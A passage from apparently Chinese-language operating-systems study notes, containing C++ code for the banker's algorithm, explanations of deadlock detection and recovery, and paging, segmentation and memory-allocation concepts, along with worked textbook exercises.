class="hljs-number">0</span>; i &lt; process_num; i++) <span class="hljs-comment">//设置false</span><br>    &#123;<br>        finish[i] = <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++) <span class="hljs-comment">////满足条件释放资源，并从头开始扫描进程集合</span><br>    &#123;<br>        count = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>            <span class="hljs-keyword">if</span> (finish[i] == <span class="hljs-literal">false</span> &amp;&amp; Need[i][j] &lt;= work[j])<br>                count++;<br>        <span class="hljs-keyword">if</span> (count == recourse_num) <span class="hljs-comment">//当进程各类资源都满足NEED&lt;=WORK时</span><br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>                work[j] = work[j] + Allocation[i][j]; <span class="hljs-comment">//释放进程</span><br>            finish[i] = <span class="hljs-literal">true</span>;<br>            sign[k] = i; <span class="hljs-comment">//记录下满足条件的进程</span><br>            k++;<br>            i = <span class="hljs-number">-1</span>; <span class="hljs-comment">//从头开始扫描</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>        <span class="hljs-keyword">if</span> (finish[i] == <span class="hljs-literal">false</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Banker_Algorithm</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span> <span class="hljs-comment">//资源请求算法</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> m = <span class="hljs-number">0</span>; m &lt; recourse_num; m++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (Request[i][m] &gt; Need[i][m])<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;所需资源数超出其宣布的最大值!&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Request[i][m] &gt; Available[m])<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;无足够资源，p[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]需等待!&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//尝试为进程分配资源</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>    &#123;<br>        Available[j] = Available[j] - Request[i][j];<br>        Allocation[i][j] = Allocation[i][j] + Request[i][j];<br>        Need[i][j] = Need[i][j] - Request[i][j];<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;尝试进行资源分配后的进程资源表: &quot;</span> &lt;&lt; endl;<br>    <span class="hljs-built_in">print_information</span>();<br>    <span class="hljs-comment">//执行安全性算法</span><br>    cout &lt;&lt; <span class="hljs-string">&quot;正在进行安全性检查&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">security_test</span>())<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;经安全性检查，系统安全，本次分配成功&quot;</span> &lt;&lt; endl;<br>        cout &lt;&lt; <span class="hljs-string">&quot;安全进程序列为：&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> p = <span class="hljs-number">0</span>; p &lt; process_num - <span class="hljs-number">1</span>; p++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; sign[p] &lt;&lt; <span class="hljs-string">&quot;]---&gt;&quot;</span>; <span class="hljs-comment">//输出安全的进程序列</span><br>        &#125;<br>        cout &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; sign[process_num - <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-string">&quot;]&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;安全性检测失败!系统不安全!!!正在恢复资源分配------&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++) <span class="hljs-comment">//恢复进程资源分配</span><br>        &#123;<br>            Available[j] = Available[j] + Request[i][j];<br>            Allocation[i][j] = Allocation[i][j] - Request[i][j];<br>            Need[i][j] = Need[i][j] + Request[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">init</span>();<br>    cout &lt;&lt; <span class="hljs-string">&quot;初始化进程信息为：&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-built_in">print_information</span>();<br>    <span class="hljs-keyword">int</span> i, tt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (tt != <span class="hljs-number">999</span>)<br>    &#123;<br>        cout &lt;&lt; endl<br>             &lt;&lt; <span class="hljs-string">&quot;请输入请求资源Request[进程标号i][资源类型j]:&quot;</span> &lt;&lt; endl;<br>        cout &lt;&lt; <span class="hljs-string">&quot;进程i=：&quot;</span>;<br>        cin &gt;&gt; i;<br>        cout &lt;&lt; <span class="hljs-string">&quot;各类资源数量(A B C)=:  &quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> m = <span class="hljs-number">0</span>; m &lt; recourse_num; m++)<br>            cin &gt;&gt; Request[i][m];<br>        cout &lt;&lt; endl;<br>        <span class="hljs-comment">//执行银行家算法</span><br>        <span class="hljs-built_in">Banker_Algorithm</span>(i);<br>        <span class="hljs-comment">//输出每次判断产生的执行序列</span><br>        cout &lt;&lt; endl<br>             &lt;&lt; <span class="hljs-string">&quot;当前资源分配表：&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-built_in">print_information</span>();<br>        cout &lt;&lt; endl<br>             &lt;&lt; <span class="hljs-string">&quot;请输入N(当N=999退出)：&quot;</span> &lt;&lt; endl;<br>        cin &gt;&gt; tt;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="3银行家算法缺点"><a class="markdownIt-Anchor" href="#3银行家算法缺点"></a> 3）银行家算法缺点</h4><ul><li>进程很难在运行前知道其所需资源的最大值。</li><li>系统中各进程之间必须是无关的，即没有同步要求，无法处理有同步关系的进程。</li><li>进程的数量和资源的数目是固定不变的，无法处理进程数量和资源数目动态变化的情况。</li></ul><h2 id="76-死锁检测"><a class="markdownIt-Anchor" href="#76-死锁检测"></a> 7.6 死锁检测</h2><h3 id="761-每种资源类型只有单个"><a class="markdownIt-Anchor" href="#761-每种资源类型只有单个"></a> 7.6.1 每种资源类型只有单个</h3><p>如果所有资源类型只有单个实例，那么可以定义这样一个死锁检测算法，该算法使用了资源分配图的一个变种，称为等待（wait-for）图。从资源分配图中，删除所有资源类型节点，合并适当边，就可以得到等待图。</p><p>当且仅当等待图中有一个环， 系统中存在死锁。 为了检测死锁， 系统需要维护等待图，并周期性地调用在图中进行搜索的算法。从图中检测环的算法需要n<sup>2</sup>级操作， 其中n为图中的节点数。</p><p><img src="/posts/8ce3e425/image-20220111113157466.png" alt="image-20220111113157466"></p><h3 id="762-每种资源类型可有多个"><a class="markdownIt-Anchor" href="#762-每种资源类型可有多个"></a> 7.6.2 每种资源类型可有多个</h3><p><img src="/posts/8ce3e425/image-20220111114549547.png" alt="image-20220111114549547"></p><p><img src="/posts/8ce3e425/image-20220111114535791.png" alt="image-20220111114535791"></p><h2 id="77-死锁恢复"><a class="markdownIt-Anchor" href="#77-死锁恢复"></a> 7.7 死锁恢复</h2><p>打破死锁有两个方法。</p><ul><li>一个方法是简单地终止一个或多个进程以打破循环等待。</li><li>另一个方法是从一个或多个死锁进程那里抢占一个或多个资源。</li></ul><h3 id="771-进程终止"><a class="markdownIt-Anchor" href="#771-进程终止"></a> 7.7.1 进程终止</h3><p>有两种方法通过终止进程以取消死锁。 不管采用哪个方法，系统都会收回分配给被终止进程的所有资源。</p><ul><li>终止所有死锁进程。这种方法显然终止了死锁循环，但其代价也大。这些进程可能己计算了很长时间，这些部分计算结果必须放弃，以后可能还要重新计算。</li><li>一次只终止一个进程直到取消死锁循环为止。这种方法的开销会相当大，这是因为每次终止一个进程，都必须调用死锁检测算法以确定进程是否仍处于死锁。</li></ul><h3 id="772-资源抢占"><a class="markdownIt-Anchor" href="#772-资源抢占"></a> 7.7.2 资源抢占</h3><p>如果要求使用抢占来处理死锁， 那么有三个问题需要处理：</p><ol><li>选择一个牺牲品： 抢占哪些资源和哪个进程？与进程取消一样， 必须确定抢占顺序以便代价最小化。代价因素包括许多参数， 如死锁进程所拥有的资源数量，死锁进程到现在为止在其执行过程中所消耗的时间。</li><li>回滚：如果从一个进程那里抢占一个资源，那么该进程不能正常执行，它缺少所需要的资源。 必须将进程回液到某个安全状态，以便从该状态重启进程。 通常确定一个安全状态并不容易，所以最简单的方法是完全回滚：终止进程并重新执行。更为有效的方法是将进程回滚到足够打破死锁。 另一方面，这种方法要求系统维护有关运行进程状态的更多信息。</li><li>饥饿：如果一个系统是基于代价来选择牺牲进程， 那么同一进程可能总是被选为牺牲品。结果，这个进程永远不能完成其指定任务，任何实际系统都需要处理这种饥饿情况。显然，必须确保一个进程只能有限地被选择为牺牲品。最为常用的方法是在代价因素中加上回滚次数。</li></ol><h2 id="78-习题"><a class="markdownIt-Anchor" href="#78-习题"></a> 7.8 习题</h2><h3 id="74"><a class="markdownIt-Anchor" href="#74"></a> 7.4</h3><blockquote><p>根据如下两点， 比较循环等待方法与各种死锁避免方法（如银行家算法〉：<br>a. 运行时开销。<br>b. 系统吞吐量。</p></blockquote><p>由于跟踪当前资源分配的成本，死锁避免方案往往会增加运行时开销。然而，与静态防止死锁形成的方案相比，死锁避免方案允许更多的资源并发使用。从这个意义上讲，死锁避免方案可以提高系统吞吐量。</p><h3 id="75"><a class="markdownIt-Anchor" href="#75"></a> 7.5</h3><blockquote><p>在一个真实的计算机系统中 ， 可用的资源和进程对资源的要求都不会持续很久（几个月〉。资源会损坏和被替换， 新的进程会进入和离开系统， 新的资源会被购买和 加入系统。 如果用银行家算法控制<br>死锁，下面哪些变化在什么情况下是安全的（不会导致死锁） ？</p><ul><li>a. 增加可用资源〈新的资源被加入系统）</li><li>b. 减少可用资源（资源被从系统中永久性地移出〉</li><li>c. 增加一个进程的Max （进程需要更多的资源， 超过所允许</li><li>的资源）</li><li>d. 减少一个进程的Max （进程不再需要那么多资源）</li><li>e. 增加进程的数量</li><li>t. 减少进程的数量</li></ul></blockquote><p>a，d，f安全</p><p>e需要在给进程分配资源时确保系统不会进入不安全状态</p><p>b,c可能会导致死锁，如果进入不安全状态的话</p><h3 id="78"><a class="markdownIt-Anchor" href="#78"></a> 7.8</h3><blockquote><p>考虑这样的哲学家就餐问题： 筷子放在桌子中央， 且一个哲学家可使用任两只筷子。假定一次只能请求一只筷子。设计一简单规则， 可以根据现有筷子分配来确定某个请求是否可满足而不会出现死锁。</p></blockquote><p>以下规则避免了死锁：当一个哲学家发出一个需要第一根筷子的请求时，如果没有别的哲学家有两根筷子或者只留有一根筷子时，这个请求就不被允许。</p><h3 id="711"><a class="markdownIt-Anchor" href="#711"></a> 7.11</h3><blockquote><p>考虑下面的一个系统在某一时刻的状态。</p><p><img src="/posts/8ce3e425/image-20211201232218325.png" alt="image-20211201232218325"></p><p>使用银行家算法回答下面问题：<br>a.Need 矩阵的内容是怎样的？<br>b. 系统是否处于安全状态？<br>c. 如果从进程Pi 发来一个请求(0，4，2,0）， 这个请求能否立刻被满足？</p></blockquote><p>a. Need矩阵的内容是</p><p>P<sub>0</sub>(0 0 0 0),</p><p>P<sub>1</sub>(0 7 5 0),</p><p>P<sub>2</sub>(1 0 0 2),</p><p>P<sub>3</sub>(0 0 2 0),</p><p>P<sub>4</sub>(0 6 4 0)。</p><p>b. 系统处于安全状态， 因为Available矩阵等于(1 5 2 0),进程P<sub>0</sub>和P<sub>3</sub>都可以运行，<br>当进程P<sub>3</sub>运行完时，它释放它的资源，而允许其它进程运行。</p><p>c. 可以被满足，满足以后， Available矩阵等于(1 1 0 0) ，当以次序P<sub>0</sub>,P<sub>1</sub>,P<sub>2</sub>, P<sub>3</sub>,P<sub>4</sub>运行时<br>，可以完成运行。</p><h1 id="第8章-内存管理"><a class="markdownIt-Anchor" href="#第8章-内存管理"></a> 第8章 内存管理</h1><h2 id="81-背景"><a class="markdownIt-Anchor" href="#81-背景"></a> 8.1 背景</h2><h3 id="811-基本硬件"><a class="markdownIt-Anchor" href="#811-基本硬件"></a> 8.1.1 基本硬件</h3><p>基地址寄存器含有最小的合法物理内存地址，</p><p>而界限地址寄存器决定了范围的大小。</p><p><img src="/posts/8ce3e425/image-20220110151139132.png" alt="image-20220110151139132"></p><p><img src="/posts/8ce3e425/image-20220110151147020.png" alt="image-20220110151147020"></p><h3 id="812-地址绑定"><a class="markdownIt-Anchor" href="#812-地址绑定"></a> 8.1.2 地址绑定</h3><p>将指令与数据绑定到内存地址有以下几种情况：</p><ul><li>编译时(compile time)：如果在编译时就知道进程将在内存中的驻留地址，那么就可以生成绝对代码（absolute code）。</li><li>加载时(load time）：如果在编译时并不知道进程将驻留在内存的什么地方，那么编译器就必须生成可重定位代码 （relocatable code）。</li><li>执行时(execution time）：如果进程在执行时可以从一个内存段移到另一个内存段，那么绑定必须延迟到执行时才进行。</li></ul><h3 id="813-逻辑地址空间与物理地址空间"><a class="markdownIt-Anchor" href="#813-逻辑地址空间与物理地址空间"></a> 8.1.3 逻辑地址空间与物理地址空间</h3><p>CPU所生成的地址通常称为<strong>逻辑地址</strong>（logical address），而内存单元所看到的地址（即加载到内存地址寄存器（memory-address register）中的地址） 通常称为<strong>物理地址</strong> （physical address）</p><p>运行时从虚拟地址到物理地址的映射是由被称为<strong>内存管理单元</strong>（ memory-managementunit, <strong>MMU</strong>） 的硬件设备来完成的。</p><p><img src="/posts/8ce3e425/image-20220111210939563.png" alt="image-20220111210939563"></p><h3 id="814-动态加载"><a class="markdownIt-Anchor" href="#814-动态加载"></a> 8.1.4 动态加载</h3><p>动态加载：将加载延迟到运行时</p><p>采用<strong>动态加载</strong>时，一个子程序只有在调用时才被加载。所有子程序都以可重定位的形式保存在磁盘上。 主程序装入内存并执行。 当一个子程序需要调用另一个子程序时，调用子程序首先检查另一个子程序是否己加载。如果没有，可重定位的链接程序将用来加载所需要的子程序，并更新程序的地址表以反映这一变化。接着，控制传递给新加载的子程序。</p><p>动态加载的优点是不用的子程序决不会被加载。</p><h3 id="815-动态链接与共享库"><a class="markdownIt-Anchor" href="#815-动态链接与共享库"></a> 8.1.5 动态链接与共享库</h3><p>动态链接：将链接延迟到运行时。</p><p>优点：</p><ul><li><p>使用语言库的所有进程只需要一个库代码副本</p></li><li><p>可用于库更新（如修改漏洞〉。 一个库可以被新的版本所替代且使用该库的所有程序会自动使用新的版本。</p></li></ul><h2 id="82交换"><a class="markdownIt-Anchor" href="#82交换"></a> 8.2交换</h2><p>进程可以暂时从内存中交换（swap）到备份存储(backing store）上， 当需要再次执行时再调回到内存中。</p><p>这种交换策略的变种被用在基于优先级的调度算法中。 如果有一个更高优先级的进程且需要服务，内存管理器可以交换出低优先级的进程，以便可以装入和执行更高优先级的进程。 当更高优先级的进程执行完后，低优先级进程可以交换回内存以继续执行。 这种交换有时称为滚出(roll out)和滚入(roll in)。</p><h2 id="83-连续内存分配"><a class="markdownIt-Anchor" href="#83-连续内存分配"></a> 8.3 连续内存分配</h2><h3 id="831-内存映射与保护"><a class="markdownIt-Anchor" href="#831-内存映射与保护"></a> 8.3.1 内存映射与保护</h3><p>重定位寄存器含有最小的物理地址值：界限地址寄存器含有逻辑地址的范围值。</p><p>每个逻辑地址必须小于界限地址寄存器。 <strong>MMU</strong>动态描将逻辑地址加上重定位寄存器的值后映射成物理地址。 映射后的物理地址再送交内存单元（见图 8.6）。</p><p><img src="/posts/8ce3e425/image-20220110154530899.png" alt="image-20220110154530899"></p><h3 id="832-内存分配"><a class="markdownIt-Anchor" href="#832-内存分配"></a> 8.3.2 内存分配</h3><p>在任意时候，有一组可用孔（块） 大小列表和输入队列。操作系统根据调度算法来对输入队列进行排序。内存不断地分配给进程， 直到下一个进程的内存需求不能满足为止，这时没有足够大的可用孔来装入进程。操作系统可以等到有足够大的空间，或者往下扫描输入队列以确定是否有其他内存需求较小的进程可以被满足。</p><p>从一组可用孔中选择一个空闲孔的最为常用方法有首次适应（firSt-fit）＇ 最佳适应（best-fit）、 最差适应（worst-fit）。</p><ul><li>**首次适应：**分配第一个足够大的孔。 查找可以从头开始，也可以从上次首次适应结束时开始。一旦找到足够大的空闲孔，就可以停止。<ul><li>特点：优先分配内存中低地址部分</li><li>优点：简单</li><li>缺点：在低地址部分会积累大量外零头</li></ul></li><li>**最佳适应：**搜索整个序列，找到适合条件的最小的分区进行分配。 这种方法可以产生最小剩余孔。<ul><li>优点：保证总有大分区可分配（排在后面）</li><li>缺点：<ul><li>效率不高，排在前面的分区不断变小，能被分出去的概率也就越来越低</li><li>外零头形成速度快</li></ul></li></ul></li><li>**最差适应：**搜索整个序列，寻找最大的分区进行分配。这种方法可以产生最大剩余孔， 该孔可能比最佳适应方法产生的较小剩余孔更为有用。<ul><li>优点：查找效率显著提高，一次就找到</li><li>缺点：大作业容纳能力会下降</li></ul></li></ul><h3 id="833-碎片"><a class="markdownIt-Anchor" href="#833-碎片"></a> 8.3.3 碎片</h3><p>首次适应方法和最佳适应方法算法都有外部碎片问题。</p><p>随着进程装入和移出内存，空闲内存空间被分为小片段。当所有总的可用内存之和可以满足请求，但并不连续时，这就出现了外部碎片问题。</p><ul><li><p>一种解决外部碎片问题的方法是紧缩。</p><p>紧缩的目的是移动内存内容， 以便所有空闲空间合并成一整块。</p></li><li><p>另一种可能解决外部碎片问题的方法是允许物理地址空间为非连续， 这样只要有物理内存就可为进程分配。 这种方案有两种互补的实现技术：分页（见8.4节)和分段（见8.7节）</p></li></ul><h2 id="84-分页"><a class="markdownIt-Anchor" href="#84-分页"></a> 8.4 分页</h2><h3 id="841-基本方法"><a class="markdownIt-Anchor" href="#841-基本方法"></a> 8.4.1 基本方法</h3><p>实现分页的基本方法涉及将物理内存分为固定大小的块，称为帧（frame）：而将逻辑内存也分为同样大小的块，称为页（page）。</p><p><img src="/posts/8ce3e425/image-20220110162401210.png" alt="image-20220110162401210"></p><p><img src="/posts/8ce3e425/image-20220110163418739.png" alt="image-20220110163418739"></p><p>由CPU生成的每个地址分为两个部分：页号（p）和页偏移（d）。页号作为页表中的索引。页表包含每页所在物理内存的基地址。</p><p>如果逻辑地址空间为2<sup>m</sup>，且页大小为2<sup>n</sup> 单元（字节或字〉， 那<br>么逻辑地址的高 m-n 位表示页号，而低n位表示页偏移。 这样， 逻辑地址如下所示：</p><p><img src="/posts/8ce3e425/image-20220110162740496.png" alt="image-20220110162740496"></p><p>设定页面大小为4 byte，物理内存是32 byte（8 页)。逻辑地址0 在第0页，页偏移为0。根据索引页表，我们发现第0页在第5帧。这样，逻辑地址0 映射到物理地址20 (= (5 × 4) + 0)。逻辑地址3（第0 页，页偏移为3）映射到物理地址23 (= (5 × 4) + 3)。逻辑地址4 在第1页，偏移量为0；根据页表，第1 页被映射到第6 帧。这样，逻辑地址4 映射到物理地址24 (= (6 × 4) + 0)。逻辑地址13映射到物理地址9。</p><p><img src="/posts/8ce3e425/image-20220110163340244.png" alt="image-20220110163340244"></p><p><strong>分页机制的特点</strong></p><ul><li>分页机制不会产生外部碎片：任何空闲帧都被分配给所需的进程。</li><li>分页机制会产生内部碎片。</li></ul><p>实例：</p><blockquote><p>1.<img src="/posts/8ce3e425/image-20220110165126064.png" alt="image-20220110165126064"></p><ol start="2"><li></li></ol><p>存储器的用户空间共有 32 个页面，每页 1KB，内存16KB。假定某时刻系统为用户的第 0、1、2、3 页分别分配的物理块号为 5、10、4、7，试将逻辑地址 0A5C 和093C 变换为物理地址。</p><p><img src="/posts/8ce3e425/image-20220110165235908.png" alt="image-20220110165235908"></p></blockquote><h3 id="842-硬件支持"><a class="markdownIt-Anchor" href="#842-硬件支持"></a> 8.4.2 硬件支持</h3><p>转换表缓冲区（translation look-aside buffer, TLB）。 TLB 是关联的快速内存。</p><p>TLB 条目由两部分组成： 键（标签） 和值。 当关联内存根据给定值查找时，它会同时与所有键进行比较。 如果找到条目，那么就得到相应的值域。</p><p>TLB 与页表一起按如下方法使用：</p><ul><li>TLB只包括页表中的一小部分条目。当CPU产生逻辑地址后，其页号提交给TLB。</li><li>如果找到页号，那么也就得到了帧号，并可用来访问内存。</li><li>如果页码不在 TLB 中（称为 TLB 失效），那么就需要访问页表。当得到帧号后，就可以用它来访问内存（如图 8.11 所示）。 同时，将页号和帧号增加到 TLB 中，这样下次再用时就可很快查找到。如果 TLB 中的条目己满，那么操作系统会选择一个来替换。</li></ul><p><img src="/posts/8ce3e425/image-20220110170044634.png" alt="image-20220110170044634"></p><h3 id="843-保护"><a class="markdownIt-Anchor" href="#843-保护"></a> 8.4.3 保护</h3><p>在分页环境下，内存保护是通过与每个帧相关联的保护位来实现的。</p><p>可以用<strong>一个位来定义一个页是可读写还是只读的</strong>。每次地址引用都要通过页表来查找正确的帧码，在计算物理地址的同时，可以通过检查保护位来验证有没有对只读页进行写操作。对只读页进行写操作会向操作系统产生硬件陷阱〈或内存保护冲突〉</p><p>还有一个位通常与页表中的每一条目相关联：<strong>有效－无效位</strong>。当该位为有效时，表 示相关的页在进程的逻辑地址空间内，因此是合法（或有效）的页。当该位为无效时，表示相关的页不在进程的逻辑地址空间内。**通常是指该页的内容不在内存，在磁盘上。**通过使用有效一无效位可以捕捉到非法地址。操作系统通过对该位的设置可以允许或不允许对某页的访问。</p><h2 id="85-页表结构"><a class="markdownIt-Anchor" href="#85-页表结构"></a> 8.5 页表结构</h2><h3 id="851-层次页表"><a class="markdownIt-Anchor" href="#851-层次页表"></a> 8.5.1 层次页表</h3><p>两级分页算法：将页表再分页</p><p><img src="/posts/8ce3e425/image-20220110172004055.png" alt="image-20220110172004055"></p><p><img src="/posts/8ce3e425/image-20220110172010959.png" alt="image-20220110172010959"></p><p><img src="/posts/8ce3e425/image-20220110172019871.png" alt="image-20220110172019871"></p><p>对于 64位体系结构，层次页表通常并不适合。</p><h3 id="852-哈希页表"><a class="markdownIt-Anchor" href="#852-哈希页表"></a> 8.5.2 哈希页表</h3><p>处理超过 32 位地址空间的常用方法是使用<strong>哈希页表</strong>（hashed page table），并以虚拟页码作为哈希值。哈希页表的每一条目都包括一个链表的元素，这些元素哈希成同一位置（要处理碰撞〉。 每个元素有 3 个域：</p><p>（1）虚拟页码，</p><p>（2）所映射的帧号，</p><p>（3）指向链表中下一个元素的指针。</p><p>该算法按如下方式工作： 虚拟地址中的虚拟页号转换到哈希表中， 用虚拟页号与链表中的每一个元素的第一个域相比较。如果匹配，那么 相应的帧号（第二个域）就用来形成物理地址：如果不匹配，那么就对链表中的下一个节点进行比较，以寻找一个匹配的页号。<br>该方案如图 8.16 所示</p><p><img src="/posts/8ce3e425/image-20220110172339613.png" alt="image-20220110172339613"></p><h3 id="853-反向页表"><a class="markdownIt-Anchor" href="#853-反向页表"></a> 8.5.3 反向页表</h3><p>反向页表对于每个真正的内存页或帧才有一个条目。 每个条目包含保存在真正内存位置的页的虚拟地址以及拥有该页的进程的信息。 因此， 整个系统只有一个页表， 对每个物理内存的页只有一条相应的条目。</p><p><img src="/posts/8ce3e425/image-20220110172931237.png" alt="image-20220110172931237"></p><h2 id="86-分段"><a class="markdownIt-Anchor" href="#86-分段"></a> 8.6 分段</h2><h3 id="861-基本方法"><a class="markdownIt-Anchor" href="#861-基本方法"></a> 8.6.1 基本方法</h3><p>分段（segmentation）就是支持这种用户视角的内存管理方案。 逻辑地址空间是由一组段组成的。 每个段都有名称和长度。 地址指定了段名称和段内偏移。 因此用户通过两个量来指定地址：段名称和偏移（请将这一方案与分页相比较。在分页中，用户只指定一个地址，<br>该地址通过硬件分为页码和偏移，对于这些，程序员是看不见的）</p><h3 id="862-硬件"><a class="markdownIt-Anchor" href="#862-硬件"></a> 8.6.2 硬件</h3><p>段表的使用如图 8.19 所示。 一个逻辑地址由两部分组成： 段号s和段内的偏移d。段号用做段表的索引， 逻辑地址的偏移d应位于0和段界限之间。</p><p><img src="/posts/8ce3e425/image-20220110174321311.png" alt="image-20220110174321311"></p><p><img src="/posts/8ce3e425/image-20220110174328309.png" alt="image-20220110174328309"></p><p><strong>分段式与分页式的区别</strong></p><ul><li><ol><li>可见与不可见</li></ol><ul><li>“分页”是系统活动，用户无法介入，页的大小固定</li><li>“分段”是用户可见的，段大小可变</li></ul></li><li><ol start="2"><li>物理单位与逻辑单位</li></ol><ul><li>页是信息的物理单位，不是完整的逻辑单位</li><li>段是完整的逻辑信息单位</li></ul></li><li><ol start="3"><li>地址空间</li></ol><ul><li>分页的作业空间是一维的，是单一线性空间</li><li>分段的作业空间是二维的。</li></ul></li></ul><h3 id="863-段页式存储管理"><a class="markdownIt-Anchor" href="#863-段页式存储管理"></a> 8.6.3 段页式存储管理</h3><p><strong>引入</strong></p><p>分页管理内存管理效率高</p><ul><li>没有外零头</li><li>内零头小</li></ul><p>分段管理符合模块化思想</p><ul><li>每个分段都具备完整的功能</li><li>方便代码共享、保护</li></ul><p><strong>段页式管理的基本思想</strong></p><ul><li>用户程序分段、段内分页</li><li>系统内存分块</li><li>每块装入一页，各块之间可以不连续</li><li>一个有效地址＝（段名，段内地址）＝（段名，段内页号+页内地址）</li></ul><p><img src="/posts/8ce3e425/image-20220110175110374.png" alt="image-20220110175110374"></p><h2 id="88-习题"><a class="markdownIt-Anchor" href="#88-习题"></a> 8.8 习题</h2><h3 id="81"><a class="markdownIt-Anchor" href="#81"></a> 8.1</h3><blockquote><p>试说明内部碎片与外部碎片的区别，及解决方法</p></blockquote><p>内部碎片是某一区域或某一页中未被占据其位置的作业所使用的区域。直到作业完成， 释放页或区域 ， 这个空间才能被系统所利用。内部碎片一般无法避免</p><p>外部碎片随着进程装入和移出内存， 空闲内存空间被分为小片段。 当所有总的可用内存之和可以满足请求， 但并不连续时， 这就出现了外部碎片问题。外部碎片可通过紧缩来减少，即将空闲内存合并成大内存，也可以通过允许物理地址空间为非连续来避免， 这样只要有物理内存就可为进程分配</p><h3 id="83"><a class="markdownIt-Anchor" href="#83"></a> 8.3</h3><blockquote><p>如果有内存块100KB、500KB、200KB、300KB和600KB C按顺序〉，首次适应算法、 最佳适应算法、 最差适应算法各自将怎样放置大小分别为212KB、417KB、112KB和426KB（按顺序）的进程？哪一种算法的内存利用率最高？</p></blockquote><p>最先适应：</p><ul><li>212KB被放入500KB内存部分</li><li>417KB被放入600KB内存部分</li><li>112KB被放入288KB(500KB-212KB)内存部分</li><li>426KBz需要等待</li></ul><p>最佳适应：</p><ul><li>212KB被放入300KB内存部分</li><li>417KB被放入500KB内存部分</li><li>112KB被放入200KB内存部分</li><li>426KB被放入600KB内存部分</li></ul><p>最差适应：</p><ul><li>212KB被内存600KB放入部分</li><li>417KB被放入500KB内存部分</li><li>112KB被放入388KB内存部分</li><li>426KB需要等待</li></ul><p>最佳适应算法的内存利用率最高</p><h3 id="84"><a class="markdownIt-Anchor" href="#84"></a> 8.4</h3><blockquote><p>绝大多数系统允许程序在执行时分配更多的内存给它自己的地址空间。 程序的堆段中的数据分配就是这样一个内存分配实例。 在下面的方法中，支持动态内存分配需要什么？</p><p>a.连续内存分配</p><p>b.纯分段</p><p>c.纯分页</p></blockquote><p>a.连续内存分配：当没有足够的空间给程序去扩大它已分配的内存空间时，将要求重新分配整个程序。<br>b.纯段式分配：当没有足够的空间给段去扩大它的己分配内存空回时，将要求重新分配整个段。<br>c.纯页式分配：在没有要求程序地址空间再分配的方案下，新页增加的分配是可能的。</p><h3 id="85"><a class="markdownIt-Anchor" href="#85"></a> 8.5</h3><blockquote><p>对下列问题，试比较连续内存分配方案、纯分段方案和纯分页方案中的内存组织方法<br>a.外部碎片<br>b.内部碎片<br>c.共享跨进程代码的能力</p></blockquote><p>连续内存分配方案</p><ul><li>会受到外部碎片的影响，因为地址空间是连续分配的，随着旧进程的消亡和新进程的启动，会出现空洞。</li><li>它还不允许进程共享代码，因为进程的虚拟内存段不会被分解成不连续的细粒度段。</li></ul><p>纯分段</p><ul><li>也会受到外部碎片的影响，因为进程的一段被连续地布置在物理内存中，而当死进程的段被新进程的段替换时，将会发生碎片。</li><li>然而，分段使进程能够共享代码，例如，两个不同的进程可以共享一个代码段，但具有不同的数据段。</li></ul><p>纯分页</p><ul><li>不会受到外部碎片的影响，而是会受到内部碎片的影响。进程是按页面粒度分配的，如果页面没有得到充分利用，就会导致内部碎片和相应的空间浪费。</li><li>分页还使进程能够在分页的粒度上共享代码。</li></ul><h3 id="89"><a class="markdownIt-Anchor" href="#89"></a> 8.9</h3><blockquote><p>8.9 